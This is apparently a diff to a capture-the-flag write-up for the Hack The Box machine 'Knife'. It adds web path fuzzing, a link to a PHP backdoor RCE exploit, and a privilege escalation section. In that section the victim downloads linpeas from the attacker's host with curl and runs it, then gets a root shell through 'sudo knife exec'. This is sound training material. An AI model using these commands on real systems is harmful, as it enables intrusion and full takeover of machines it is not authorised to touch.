@@ -5,16 +5,14 @@ description: 10.10.10.242
 # Knife
 
 Tags
-* TODO
+* gtfobins
 
 <!--
 
-Required tools
-* TODO
-
 Other commands/tools
 ```
-TODO
+ffuf
+gobuster
 ```
 
 -->
@@ -42,8 +40,17 @@ PORT   STATE SERVICE VERSION
 |_http-title:  Emergent Medical Idea
 ```
 
-Gobuster
+Web path fuzzers
 ```bash
+ffuf -u http://10.10.10.242/FUZZ \
+  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
+
+gobuster dir \
+  -u http://10.10.10.242 \
+  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/Apache.fuzz.txt \
+  -t 100 \
+  -o gobuster.out
+
 gobuster dir \
   -u http://10.10.10.242 \
   -w /git-repos/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt \
@@ -84,20 +91,6 @@ gobuster dir \
 /.htuser              (Status: 403) [Size: 277]
 /.htm2                (Status: 403) [Size: 277]
 /.html-               (Status: 403) [Size: 277]
-
-gobuster dir \
-  -u http://10.10.10.242 \
-  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/Apache.fuzz.txt \
-  -t 100 \
-  -o gobuster.out
-
-# output
-===============================================================
-//.htaccess           (Status: 403) [Size: 277]
-//.htaccess.bak       (Status: 403) [Size: 277]
-//.htpasswd           (Status: 403) [Size: 277]
-//server-status       (Status: 403) [Size: 277]
-Progress: 6527 / 8532 (76.50%)
 ```
 
 [PHP 8.1.0-dev Backdoor Remote Code Execution](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
@@ -124,4 +117,40 @@ mv /home/james/.ssh/id_rsa.pub /home/james/.ssh/authorized_keys
 # [attacker] save to id_rsa
 chmod 600 id_rsa
 ssh -i id_rsa -o StrictHostKeyChecking=no james@10.10.10.242
+```
+
+### Privilege Escalation
+
+Upload privesc script
+```bash
+# [attacker] download and expose script
+mkdir -p /share/www && \
+  curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh &&
+  python3 -m http.server -d /share/www
+
+# [victim] use tun0 <IP_ADDRESS> of attacker
+curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
+bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt
+less -r /dev/shm/linpeas.txt
+
+# output
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+```
+
+User is allowed to run `knife` as root with `sudo`
+
+* [knife](https://docs.chef.io/workstation/knife)
+* [GTFOBins](https://gtfobins.github.io/gtfobins/knife)
+
+```bash
+# spawns a shell with root permission
+sudo knife exec -E 'exec "/bin/sh"'
+
+cat /root/root.txt
 ```
